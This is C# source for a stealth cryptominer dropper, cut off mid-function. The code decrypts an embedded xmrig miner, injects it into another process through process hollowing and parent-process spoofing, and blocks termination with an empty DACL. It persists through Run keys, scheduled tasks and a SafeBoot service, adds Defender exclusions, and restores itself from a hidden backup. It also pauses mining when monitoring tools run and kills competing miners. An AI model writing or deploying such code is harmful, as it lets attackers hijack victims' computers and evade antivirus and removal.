using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace MinerStub;

internal class Program
{
    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOW
    {
        public uint   cb;
        private uint  _pad0;
        public nint   lpReserved, lpDesktop, lpTitle;
        public uint   dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        private uint  _pad1;
        public nint   lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public nint  hProcess, hThread;
        public uint  dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOEXW
    {
        public STARTUPINFOW StartupInfo;
        public nint lpAttributeList;
    }

    // Hidden message window — receives WM_QUERYENDSESSION/WM_ENDSESSION on shutdown.
    // Replaces AllocConsole() which caused a visible white flash at startup.
    [StructLayout(LayoutKind.Sequential)]
    private struct WNDCLASSEXW
    {
        public uint  cbSize, style;
        public nint  lpfnWndProc;
        public int   cbClsExtra, cbWndExtra;
        public nint  hInstance, hIcon, hCursor, hbrBackground;
        public nint  lpszMenuName, lpszClassName;
        public nint  hIconSm;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public nint hwnd; public uint message; public nint wParam, lParam;
        public uint time; public int ptX, ptY;
    }

    // ── P/Invoke ──────────────────────────────────────────────────────────────
    [DllImport("kernel32.dll")] private static extern uint SetThreadExecutionState(uint f);
    [DllImport("user32.dll")]   private static extern bool GetLastInputInfo(ref LASTINPUTINFO i);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(string? app, string? cmd,
        nint pa, nint ta, bool inherit, uint flags, nint env, string? dir,
        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] private static extern uint ResumeThread(nint hThread);
    [DllImport("kernel32.dll")] private static extern uint WaitForSingleObject(nint h, uint ms);
    [DllImport("kernel32.dll")] private static extern bool CloseHandle(nint h);
    [DllImport("kernel32.dll")] private static extern bool TerminateProcess(nint hProcess, uint code);
    [DllImport("kernel32.dll")] private static extern nint GetCurrentProcess();
    [DllImport("kernel32.dll")] private static extern bool GetThreadContext(nint hThread, nint lpCtx);
    [DllImport("kernel32.dll")] private static extern bool SetThreadContext(nint hThread, nint lpCtx);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern nint CreateFileW(string name, uint access, uint share,
        nint sa, uint disp, uint flags, nint tmpl);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateSection(out nint hSection, uint access, nint objAttr,
        nint maxSize, uint pageProt, uint allocAttr, nint hFile);
    [DllImport("ntdll.dll")]
    private static extern int NtMapViewOfSection(nint hSection, nint hProcess, ref nint baseAddr,
        nuint zeroBits, nuint commitSize, nint sectionOffset, ref nuint viewSize,
        uint inheritDisp, uint allocType, uint win32Prot);
    [DllImport("ntdll.dll")]
    private static extern int NtUnmapViewOfSection(nint hProc, nint baseAddr);
    [DllImport("advapi32.dll")]
    private static extern bool InitializeSecurityDescriptor(nint pSD, uint rev);
    [DllImport("advapi32.dll")]
    private static extern bool SetSecurityDescriptorDacl(nint pSD, bool present, nint pDacl, bool defaulted);
    [DllImport("advapi32.dll")]
    private static extern bool SetKernelObjectSecurity(nint handle, uint info, nint pSD);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegCreateKeyExW(nint root, string key, uint res, nint cls,
        uint opts, uint sam, nint sa, out nint hk, out uint disp);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegSetValueExW(nint hk, string name, uint res, uint type,
        byte[] data, uint cb);
    [DllImport("advapi32.dll")] private static extern int RegCloseKey(nint hk);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegOpenKeyExW(nint hKey, string subKey, uint options, uint sam, out nint result);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int RegQueryValueExW(nint hKey, string valueName, nint reserved, out uint type, byte[]? data, ref uint cb);
    [DllImport("kernel32.dll")] private static extern nint VirtualAlloc(nint addr, nuint size, uint type, uint prot);
    [DllImport("kernel32.dll")] private static extern bool VirtualFree(nint addr, nuint size, uint type);
    // PPID spoofing — makes hollow appear as child of explorer instead of miner
    [DllImport("kernel32.dll")] private static extern nint OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] private static extern bool InitializeProcThreadAttributeList(nint list, int count, int flags, ref nint size);
    [DllImport("kernel32.dll")] private static extern bool UpdateProcThreadAttribute(nint list, uint flags, nint attr, nint val, nint size, nint prev, nint ret);
    [DllImport("kernel32.dll")] private static extern void DeleteProcThreadAttributeList(nint list);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "CreateProcessW")]
    private static extern bool CreateProcessWEx(string? app, string? cmd,
        nint pa, nint ta, bool inherit, uint flags, nint env, string? dir,
        ref STARTUPINFOEXW si, out PROCESS_INFORMATION pi);
    // SafeBoot service install
    [DllImport("advapi32.dll")] private static extern nint OpenSCManagerW(nint m, nint db, uint acc);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern nint OpenServiceW(nint hSCM, string svcName, uint access);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern nint CreateServiceW(nint hSCM, string svcName, string display,
        uint access, uint type, uint start, uint error,
        string binPath, nint group, nint tagId, nint deps, nint acct, nint pwd);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    private static extern bool ChangeServiceConfigW(nint hSvc, uint type, uint start, uint error,
        string? binPath, nint group, nint tagId, nint deps, nint acct, nint pwd, string? display);
    [DllImport("advapi32.dll")] private static extern bool CloseServiceHandle(nint h);
    // Hidden message window — replaces AllocConsole for shutdown notification
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern nint GetModuleHandleW(string? name);
    [DllImport("user32.dll")]
    private static extern ushort RegisterClassExW(ref WNDCLASSEXW wc);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern nint CreateWindowExW(uint exStyle, nint cls, nint title, uint style,
        int x, int y, int w, int h, nint parent, nint menu, nint hInst, nint param);
    [DllImport("user32.dll")]
    private static extern nint DefWindowProcW(nint hWnd, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")]
    private static extern int GetMessageW(ref MSG msg, nint hWnd, uint min, uint max);
    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")]
    private static extern nint DispatchMessageW(ref MSG msg);

    private static readonly string _logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "miner_debug.log");
    private static void Log(string msg)
    {
        try { System.IO.File.AppendAllText(_logPath, $"[{DateTime.Now:HH:mm:ss.fff}] {msg}\n"); } catch { }
    }


    // ── x64 CONTEXT offsets ───────────────────────────────────────────────────
    private const int CTX_SIZE  = 1232; // sizeof(CONTEXT) x64
    private const int CTX_FLAGS = 0x30;
    private const int CTX_RDX   = 0x88;
    private const int CTX_RIP   = 0xF8;
    private const uint CONTEXT_CTRL_INT = 0x100003; // CONTEXT_CONTROL | CONTEXT_INTEGER only — avoids XSAVE/AVX overflow


    // ── Http client for stats reporting ──────────────────────────────────────
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(8) };

    // Internal xmrig API port — auto-assigned at startup, never exposed publicly
    private static int _internalApiPort = 0;
    // Set by stealth monitor to signal LaunchHollowed to kill the hollowed process
    private static volatile bool _hollowKillFlag = false;

    // Built-in BotKiller: process names to kill (no .exe suffix)
    private static readonly string[] _botKillerTargets = new[]
    {
        "xmrig", "xmrig-cuda", "xmrig-proxy", "cpuminer", "minerd", "ethminer",
        "nbminer", "t-rex", "gminer", "lolminer", "phoenixminer", "teamredminer",
        "claymore", "kawpowminer", "miniZ", "wildrig", "srbminer", "xmr-stak",
        "nanominer", "cgminer", "bfgminer", "z-enemy", "ttminer", "rigel"
    };
    // Handle to active hollowed process — used by shutdown handler to remove critical flag
    private static volatile nint _hollowedPid = 0;

    // Static mutex fields — must NOT be local variables in NativeAOT:
    // the AOT GC considers a local dead after its last syntactic use, so a local
    // mutex in an infinite loop gets collected mid-loop, releasing the named object
    // and letting every newly spawned watchdog think it is the first instance.
    private static System.Threading.Mutex? _instanceMutex;
    private static FileStream? _exeLock;
    private static FileStream? _backupLock;
    private static volatile bool _watchdogRunning;
    private static FileSystemWatcher? _installFsw; // kept alive — GC would release the FSW otherwise

    [System.Runtime.InteropServices.UnmanagedCallersOnly]
    private static nint ShutdownWndProc(nint hWnd, uint msg, nint wp, nint lp)
    {
        if (msg == 0x11u || msg == 0x16u) // WM_QUERYENDSESSION | WM_ENDSESSION
            _hollowKillFlag = true;
        return DefWindowProcW(hWnd, msg, wp, lp);
    }

    // Creates an invisible top-level window (0×0, WS_POPUP, no WS_VISIBLE) on a background thread
    // so this WinExe process receives WM_QUERYENDSESSION/WM_ENDSESSION from Windows on shutdown.
    // Replaces AllocConsole() which caused a brief white console flash at startup.
    private static void StartShutdownWindow()
    {
        new System.Threading.Thread(() =>
        {
            nint hInst      = GetModuleHandleW(null);
            nint clsNamePtr = Marshal.StringToHGlobalUni("SeroHwnd");
            try
            {
                unsafe
                {
                    var wc = new WNDCLASSEXW
                    {
                        cbSize        = (uint)Marshal.SizeOf<WNDCLASSEXW>(),
                        lpfnWndProc   = (nint)(delegate* unmanaged<nint, uint, nint, nint, nint>)&ShutdownWndProc,
                        hInstance     = hInst,
                        lpszClassName = clsNamePtr,
                    };
                    RegisterClassExW(ref wc);
                }
                // WS_POPUP (0x80000000) with no WS_VISIBLE — invisible, receives broadcast messages
                CreateWindowExW(0, clsNamePtr, 0, 0x80000000u, 0, 0, 0, 0, 0, 0, hInst, 0);
                MSG m = default;
                while (GetMessageW(ref m, 0, 0, 0) != 0)
                {
                    TranslateMessage(ref m);
                    DispatchMessageW(ref m);
                }
            }
            finally { Marshal.FreeHGlobal(clsNamePtr); }
        }) { IsBackground = true }.Start();
    }

    private static int _tlsProxyPort = 0;
    private static bool _xmrigHasOpenSsl = false;

    // Detect whether the xmrig binary has OpenSSL (run --version and look for "OpenSSL").
    // If OpenSSL is present, we skip the proxy and use xmrig's native TLS directly.
    private static bool DetectXmrigOpenSsl(string xmrigPath)
    {
        try
        {
            using var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName               = xmrigPath,
                Arguments              = "--version",
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            });
            if (p == null) return false;
            var output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit(3000);
            return output.Contains("OpenSSL", StringComparison.OrdinalIgnoreCase);
        }
        catch { return false; }
    }

    // Starts a loopback TLS-terminating proxy: 127.0.0.1:PORT → TLS → poolHost:poolPort
    // Allows xmrig (no OpenSSL) to use SSL pools by connecting to 127.0.0.1 in plain stratum.
    private static int StartTlsProxy(string poolHost, int poolPort)
    {
        var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
        listener.Start();
        int localPort = ((System.Net.IPEndPoint)listener.LocalEndpoint).Port;
        _ = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    var client = await listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleTlsProxy(client, poolHost, poolPort));
                }
                catch { break; }
            }
        });
        return localPort;
    }

    private static async Task HandleTlsProxy(System.Net.Sockets.TcpClient local, string host, int port)
    {
        try
        {
            using var localClient  = local;
            using var remoteClient = new System.Net.Sockets.TcpClient();
            remoteClient.ReceiveTimeout = 120000;
            remoteClient.SendTimeout    = 30000;
            await remoteClient.ConnectAsync(host, port);
            using var localStream  = localClient.GetStream();
            using var sslStream    = new System.Net.Security.SslStream(remoteClient.GetStream(), false,
                (_, _, _, _) => true);
            var sslOpts = new System.Net.Security.SslClientAuthenticationOptions
            {
                TargetHost = host,
                RemoteCertificateValidationCallback = (_, _, _, _) => true,
                EnabledSslProtocols = System.Security.Authentication.SslProtocols.None,
            };
            await sslStream.AuthenticateAsClientAsync(sslOpts);
            await Task.WhenAny(localStream.CopyToAsync(sslStream), sslStream.CopyToAsync(localStream));
        }
        catch { }
    }

    private static int FindFreePort()
    {
        try
        {
            var l = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
            l.Start();
            int p = ((System.Net.IPEndPoint)l.LocalEndpoint).Port;
            l.Stop();
            return p;
        }
        catch { return 45677; }
    }

    // xmrig bytes loaded from embedded resource (avoids 37 MB byte-array source)
    private static readonly byte[]? _xmrigBytes = LoadEmbeddedXmrig();
    private static byte[]? LoadEmbeddedXmrig()
    {
        using var s = typeof(Program).Assembly.GetManifestResourceStream("xmrig.bin");
        if (s == null) return null;
        var buf = new byte[s.Length];
        s.ReadExactly(buf);
        // SFC64 stream-cipher decrypt with per-build seed
        if (!string.IsNullOrEmpty(MinerConfig.SfcSeed))
        {
            var seed = Convert.FromBase64String(MinerConfig.SfcSeed);
            ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
                  c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
            for (int i = 0; i < buf.Length; i++)
            {
                ulong k = a + b + d; d++;
                a = b ^ (b >> 11);
                b = c + (c << 3);
                c = (c << 24) | (c >> 40);
                c += k;
                buf[i] ^= (byte)k;
            }
        }
        // Deflate-decompress (xmrig.bin is stored compressed to reduce exe size)
        using var ms  = new System.IO.MemoryStream(buf);
        using var ds  = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Decompress);
        using var out_ms = new System.IO.MemoryStream();
        ds.CopyTo(out_ms);
        return out_ms.ToArray();
    }

    static async Task Main()
    {
        Log($"=== STUB START === xmrigBytes={(_xmrigBytes?.Length.ToString() ?? "NULL")}");

        var folderName = MinerConfig.InstallName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
            ? MinerConfig.InstallName[..^4] : MinerConfig.InstallName;

        // Single-instance guard — pre-check both Global\ and Local\ BEFORE creating,
        // so minute-interval scheduled task doesn't spawn a second miner when the first
        // used Local\ fallback (e.g. SafeBoot session where Global\ wasn't available).
        try { using var _ = System.Threading.Mutex.OpenExisting($"Global\\SeroXmr_{folderName}"); Log("Duplicate (global) — exit"); return; } catch { }
        try { using var _ = System.Threading.Mutex.OpenExisting($"Local\\SeroXmr_{folderName}"); Log("Duplicate (local) — exit"); return; } catch { }

        try
        {
            _instanceMutex = new System.Threading.Mutex(true, $"Global\\SeroXmr_{folderName}", out bool isNewInstance);
            Log($"Global mutex created: isNewInstance={isNewInstance}");
            if (!isNewInstance) { Log("Duplicate (global race) — exit"); return; }
        }
        catch (Exception ex)
        {
            Log($"Global mutex FAILED ({ex.Message}) — trying Local\\");
            try
            {
                _instanceMutex = new System.Threading.Mutex(true, $"Local\\SeroXmr_{folderName}", out bool isNewInstance);
                Log($"Local mutex: isNewInstance={isNewInstance}");
                if (!isNewInstance) { Log("Duplicate instance (local) — exit"); return; }
            }
            catch (Exception ex2) { Log($"Local mutex FAILED ({ex2.Message}) — no guard"); }
        }


        // Invisible message window on a background thread — receives WM_QUERYENDSESSION/WM_ENDSESSION
        // so we can clear the critical-process flag before Windows shuts us down (avoids BSOD).
        StartShutdownWindow();

        if (MinerConfig.DisableSleep)
            SetThreadExecutionState(0x80000003u);

        Log($"EnableWatchdog={MinerConfig.EnableWatchdog} EnableHollowing={MinerConfig.EnableHollowing} EnableStartup={MinerConfig.EnableStartup}");

        if (MinerConfig.EnableWatchdog)
        {
            // Empty DACL blocks taskkill/procexp from opening the process handle
            ProtectProcess(GetCurrentProcess());
            Log("ProtectProcess(self) done");

            // Exit-signal watcher: uninstaller signals this named event for clean shutdown
            try
            {
                var _exitEvent = new System.Threading.EventWaitHandle(
                    false, System.Threading.EventResetMode.ManualReset,
                    $"Global\\SeroXmr_{folderName}_exit");
                _exitEvent.Reset();
                _ = Task.Run(() =>
                {
                    _exitEvent.WaitOne();
                    _hollowKillFlag = true;
                    System.Threading.Thread.Sleep(500);
                    Environment.Exit(0);
                });
                GC.KeepAlive(_exitEvent);
            }
            catch { }
        }

        var dir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", folderName);
        Directory.CreateDirectory(dir);
        Log($"Install dir: {dir}");


        // stubExe: where the stub lives (startup persistence always points here)
        var stubExe = Path.Combine(dir, MinerConfig.InstallName);
        // xmrigExe: where the xmrig binary is written for direct-launch mode (not hollowing)
        // Different name from the stub so the stub isn't overwritten on next boot.
        var baseName = Path.GetFileNameWithoutExtension(MinerConfig.InstallName);
        var xmrigExe = Path.Combine(dir, baseName + "32.exe");
        var cfgPath  = Path.Combine(dir, "config.json");
        // exe: alias used throughout — the stub path (used by startup AND hollowing)
        var exe = stubExe;

        if (!MinerConfig.EnableHollowing && (_xmrigBytes ?? Array.Empty<byte>()).Length > 0)
        {
            await File.WriteAllBytesAsync(xmrigExe, (_xmrigBytes ?? Array.Empty<byte>()));
            Log($"xmrig written to disk: {xmrigExe}");
        }
        else if (MinerConfig.EnableHollowing)
            Log($"Hollowing mode — xmrig stays in memory ({(_xmrigBytes?.Length ?? 0)} bytes)");

        if (MinerConfig.EnableStartup)
        {
            // Always copy the stub (not xmrig) to the install path so the scheduled task
            // re-runs the stub on every boot — ensuring stealth/watchdog/idle features work.
            try
            {
                var self = Process.GetCurrentProcess().MainModule?.FileName;
                if (!string.IsNullOrEmpty(self) && File.Exists(self))
                {
                    File.Copy(self, exe, true);
                    Log($"Stub copied: {self} -> {exe}");
                }
            }
            catch (Exception ex) { Log($"Stub copy FAILED: {ex.Message}"); }
            SetupStartup(exe, cfgPath);
            Log("Startup task created");
            if (MinerConfig.EnableSafeBoot)
            {
                SetupSafeBootService(exe);
                Log("SafeBoot service created");
            }
        }

        if (MinerConfig.EnableDefenderExclusion)
        {
            AddDefenderExclusion(dir);
            Log("DefenderExclusion added");
        }

        var stealthTargets = string.IsNullOrWhiteSpace(MinerConfig.StealthProcs)
            ? Array.Empty<string>()
            : MinerConfig.StealthProcs.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

        _internalApiPort = !string.IsNullOrEmpty(MinerConfig.StatsUrl) ? FindFreePort() : 0;

        if (MinerConfig.PoolTls)
        {
            Log("PoolTls block entered");
            // Hollowing mode: xmrig is in _xmrigBytes — scan bytes for OpenSSL marker
            if (MinerConfig.EnableHollowing && (_xmrigBytes?.Length ?? 0) > 0)
            {
                _xmrigHasOpenSsl = _xmrigBytes!.AsSpan().IndexOf("OpenSSL"u8) >= 0;
                Log($"OpenSSL scan (memory): {_xmrigHasOpenSsl}");
            }
            else if (!MinerConfig.EnableHollowing && File.Exists(xmrigExe))
            {
                _xmrigHasOpenSsl = DetectXmrigOpenSsl(xmrigExe);
                Log($"OpenSSL scan (file): {_xmrigHasOpenSsl}");
            }

            if (_xmrigHasOpenSsl)
            {
                Log("xmrig has OpenSSL — using native TLS (no proxy)");
            }
            else
            {
                var rawUrl   = MinerConfig.PoolUrl;
                var colonIdx = rawUrl.LastIndexOf(':');
                var tlsHost  = colonIdx > 0 ? rawUrl[..colonIdx] : rawUrl;
                var tlsPort  = colonIdx > 0 && int.TryParse(rawUrl[(colonIdx + 1)..], out int p) ? p : 14433;
                try
                {
                    _tlsProxyPort = StartTlsProxy(tlsHost, tlsPort);
                    Log($"TLS proxy started on 127.0.0.1:{_tlsProxyPort} -> {tlsHost}:{tlsPort}");
                }
                catch (Exception ex)
                {
                    Log($"TLS proxy FAILED: {ex.GetType().Name}: {ex.Message}");
                }
            }
        }

        WriteConfig(cfgPath, MinerConfig.MaxCpuIdle);
        Log($"Config written: {cfgPath}");

        if (!string.IsNullOrEmpty(MinerConfig.StatsUrl))
            _ = Task.Run(StatsReporterAsync);
        if (MinerConfig.EnableBotKiller)
            _ = Task.Run(BotKillerAsync);
        if (MinerConfig.EnableWatchdog)
            StartInProcessWatchdog(stubExe);

        Log("Entering main mining loop");
        int lastCpu = -1;
        int loopIter = 0;
        while (true)
        {
            if (MinerConfig.EnableStartup)
            {
                // File integrity: re-copy stub if AV deleted the installed exe
                if (!File.Exists(stubExe))
                {
                    try
                    {
                        var self = Process.GetCurrentProcess().MainModule?.FileName;
                        if (!string.IsNullOrEmpty(self) && File.Exists(self))
                            File.Copy(self, stubExe, true);
                    }
                    catch { }
                }
            }

            bool stealth = IsStealthTarget(stealthTargets);
            bool idle    = IsIdle();
            int  cpu     = stealth ? 0 : (idle ? MinerConfig.MaxCpuIdle : MinerConfig.MaxCpuActive);

            loopIter++;
            if (loopIter % 6 == 1) // log every ~30s
                Log($"Loop#{loopIter} stealth={stealth} idle={idle} cpu={cpu}");

            if (cpu == 0)
            {
                try { await Task.Delay(5000); } catch { }
                continue;
            }

            if (lastCpu != cpu)
            {
                WriteConfig(cfgPath, cpu);
                lastCpu = cpu;
                Log($"CPU level changed -> {cpu}%");
            }

            try
            {
                if (MinerConfig.EnableHollowing && (_xmrigBytes ?? Array.Empty<byte>()).Length > 0)
                {
                    Log($"Starting hollow into {MinerConfig.HollowTarget} cpu={cpu}%");
                    // Run hollowing in background and monitor for stealth condition concurrently.
                    using var cts = new CancellationTokenSource();
                    _hollowKillFlag = false;
                    var hollowTask = Task.Run(() => LaunchHollowed(MinerConfig.HollowTarget, cfgPath, cpu));
                    // Stealth monitor: kill hollowed process if stealth target detected
                    _ = Task.Run(async () => {
                        while (!cts.Token.IsCancellationRequested)
                        {
                            await Task.Delay(4000, cts.Token).ConfigureAwait(false);
                            if (IsStealthTarget(stealthTargets)) { _hollowKillFlag = true; return; }
                        }
                    });
                    await hollowTask;
                    cts.Cancel();
                    lastCpu = -1; // force config rewrite on next iteration
                }
                else
                {
                    using var cts  = new CancellationTokenSource();
                    // Nanopool / F2Pool / most modern pools: user = wallet.workerName
                    var user2 = !string.IsNullOrEmpty(MinerConfig.WorkerName)
                        ? $"{MinerConfig.Wallet}.{MinerConfig.WorkerName}"
                        : MinerConfig.Wallet;
                    var pass2 = !string.IsNullOrEmpty(MinerConfig.Password) ? MinerConfig.Password : "x";
                    var effectivePool = (MinerConfig.PoolTls && _tlsProxyPort > 0)
                        ? $"127.0.0.1:{_tlsProxyPort}" : MinerConfig.PoolUrl;
                    var xmrigArgs = $"-o \"{effectivePool}\" -u \"{user2}\" -p \"{pass2}\" -a \"{MinerConfig.Algo}\" --no-color --donate-level=0 --cpu-max-threads-hint={cpu}";
                    if (_internalApiPort > 0)
                        xmrigArgs += $" --http-host=127.0.0.1 --http-port={_internalApiPort}";
                    using var proc = Process.Start(new ProcessStartInfo
                    {
                        FileName        = xmrigExe,
                        Arguments       = xmrigArgs,
                        CreateNoWindow  = true,
                        UseShellExecute = false,
                    });
                    if (proc != null)
                    {
                        if (MinerConfig.EnableWatchdog)
                            ProtectProcess(proc.Handle);
                        // Stealth monitor: kill xmrig if stealth target detected
                        _ = Task.Run(async () => {
                            while (!cts.Token.IsCancellationRequested)
                            {
                                await Task.Delay(4000, cts.Token).ConfigureAwait(false);
                                if (IsStealthTarget(stealthTargets))
                                    try { proc.Kill(true); } catch { }
                            }
                        });
                        await proc.WaitForExitAsync();
                        cts.Cancel();
                        lastCpu = -1;
                    }
                }
            }
            catch { lastCpu = -1; }

            if (!MinerConfig.EnableWatchdog) break;
            try { await Task.Delay(3000); } catch { }
        }
    }

    // ── In-process watchdog (full RAT-style: backup + FSW + loop + persistence restore) ─
    // Mirror of stub/Persistence.cs StartWatchdog / WatchdogLoop / RestoreAll / CreateBackup.
    // No separate process = no suspicious child spawn loop that ESET flags as BH/GenImper.
    private static void StartInProcessWatchdog(string stubExe)
    {
        if (_watchdogRunning) return;
        _watchdogRunning = true;

        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var backupDir    = Path.Combine(localAppData, "Microsoft", "WindowsServices");
        var backupExe    = Path.Combine(backupDir, "svchost.dat");

        CreateMinerBackup(stubExe, backupDir, backupExe);
        try { _exeLock    = new FileStream(stubExe,   FileMode.Open, FileAccess.Read, FileShare.Read); } catch { }
        try { _backupLock = new FileStream(backupExe, FileMode.Open, FileAccess.Read, FileShare.Read); } catch { }

        // FileSystemWatcher: immediate restore on delete/rename — faster than polling
        try
        {
            var installDir = Path.GetDirectoryName(stubExe)!;
            _installFsw = new FileSystemWatcher(installDir)
            {
                NotifyFilter        = NotifyFilters.FileName | NotifyFilters.LastWrite,
                EnableRaisingEvents = true,
            };
            _installFsw.Deleted += (_, _) => { System.Threading.Thread.Sleep(500); MinerRestoreAll(stubExe, backupDir, backupExe); };
            _installFsw.Renamed += (_, _) => { System.Threading.Thread.Sleep(500); MinerRestoreAll(stubExe, backupDir, backupExe); };
        }
        catch { }

        // Background loop: checks every 2 s (same cadence as RAT's WatchdogLoop)
        var t = new System.Threading.Thread(() =>
        {
            while (_watchdogRunning)
            {
                try { System.Threading.Thread.Sleep(2000); MinerRestoreAll(stubExe, backupDir, backupExe); }
                catch { }
            }
        }) { IsBackground = true, Priority = System.Threading.ThreadPriority.BelowNormal };
        t.Start();
    }

    private static void MinerRestoreAll(string stubExe, string backupDir, string backupExe)
    {
        // 1. Restore exe if missing (from backup → self)
        if (!File.Exists(stubExe))
        {
            _exeLock?.Dispose(); _exeLock = null;
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(stubExe)!);
                if (File.Exists(backupExe))
                    File.Copy(backupExe, stubExe, true);
                else
                {
                    var self = Process.GetCurrentProcess().MainModule?.FileName;
                    if (!string.IsNullOrEmpty(self) && File.Exists(self))
                        File.Copy(self, stubExe, true);
                }
                for (int i = 0; i < 3 && _exeLock == null; i++)
                {
                    try { _exeLock = new FileStream(stubExe, FileMode.Open, FileAccess.Read, FileShare.Read); }
                    catch { System.Threading.Thread.Sleep(300); }
                }
                Log("Watchdog: stub restored");
            }
            catch { }
        }

        // 2. Restore backup if missing
        if (!File.Exists(backupExe))
        {
            _backupLock?.Dispose(); _backupLock = null;
            CreateMinerBackup(stubExe, backupDir, backupExe);
            try { _backupLock = new FileStream(backupExe, FileMode.Open, FileAccess.Read, FileShare.Read); } catch { }
        }

        // 3. Restore registry Run key + scheduled tasks (throttled to 60 s)
        MinerRestorePersistence(stubExe);
    }

    private static void CreateMinerBackup(string stubExe, string backupDir, string backupExe)
    {
        try
        {
            Directory.CreateDirectory(backupDir);
            if (!File.Exists(stubExe)) return;
            File.Copy(stubExe, backupExe, true);
            File.SetAttributes(backupExe, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(backupDir, FileAttributes.Hidden);
            Log($"Watchdog: backup at {backupExe}");
        }
        catch { }
    }

    private static DateTime _lastPersistCheck = DateTime.MinValue;
    private static void MinerRestorePersistence(string stubExe)
    {
        if ((DateTime.UtcNow - _lastPersistCheck).TotalSeconds < 60) return;
        _lastPersistCheck = DateTime.UtcNow;
        try
        {
            var folderName = MinerConfig.InstallName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                ? MinerConfig.InstallName[..^4] : MinerConfig.InstallName;
            var cfgPath = Path.Combine(Path.GetDirectoryName(stubExe)!, "config.json");

            // Registry Run key — restore if missing (only when EnableStartup is on)
            if (MinerConfig.EnableStartup)
            {
                const uint KEY_READ      = 0x20019;
                const uint KEY_SET_VALUE = 0x0002;
                const uint REG_SZ        = 1;
                var        HKCU          = new nint(unchecked((int)0x80000001u));
                if (RegOpenKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        0, KEY_READ, out var hkCheck) == 0)
                {
                    uint type = 0, cb = 0;
                    bool missing = RegQueryValueExW(hkCheck, folderName, 0, out type, null, ref cb) != 0;
                    RegCloseKey(hkCheck);
                    if (missing)
                    {
                        if (RegCreateKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                0, 0, 0, KEY_SET_VALUE, 0, out var hkRun, out _) == 0)
                        {
                            var val = System.Text.Encoding.Unicode.GetBytes($"\"{stubExe}\" --config=\"{cfgPath}\"\0");
                            RegSetValueExW(hkRun, folderName, 0, REG_SZ, val, (uint)val.Length);
                            RegCloseKey(hkRun);
                            Log("Watchdog: Run key restored");
                        }
                    }
                }
            }

            // Scheduled tasks — restore if missing, but only when EnableStartup is on
            bool taskMissing = false;
            if (MinerConfig.EnableStartup)
            {
                try
                {
                    using var qp = Process.Start(new ProcessStartInfo("schtasks",
                        $"/query /tn \"Microsoft\\Windows\\{folderName}\"")
                    { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true });
                    qp?.WaitForExit(5000);
                    taskMissing = qp?.ExitCode != 0;
                }
                catch { taskMissing = true; }
            }

            if (taskMissing)
            {
                using var p1 = Process.Start(new ProcessStartInfo("schtasks",
                    $"/create /f /tn \"Microsoft\\Windows\\{folderName}\" /sc onlogon /tr \"\\\"{stubExe}\\\" --config=\\\"{cfgPath}\\\"\" /rl highest")
                { CreateNoWindow = true, UseShellExecute = false });
                p1?.WaitForExit(5000);
                if (MinerConfig.EnableWatchdog)
                {
                    using var p2 = Process.Start(new ProcessStartInfo("schtasks",
                        $"/create /f /tn \"Microsoft\\Windows\\{folderName}Wd\" /sc minute /mo 1 /tr \"\\\"{stubExe}\\\" --config=\\\"{cfgPath}\\\"\" /rl highest")
                    { CreateNoWindow = true, UseShellExecute = false });
                    p2?.WaitForExit(5000);
                }
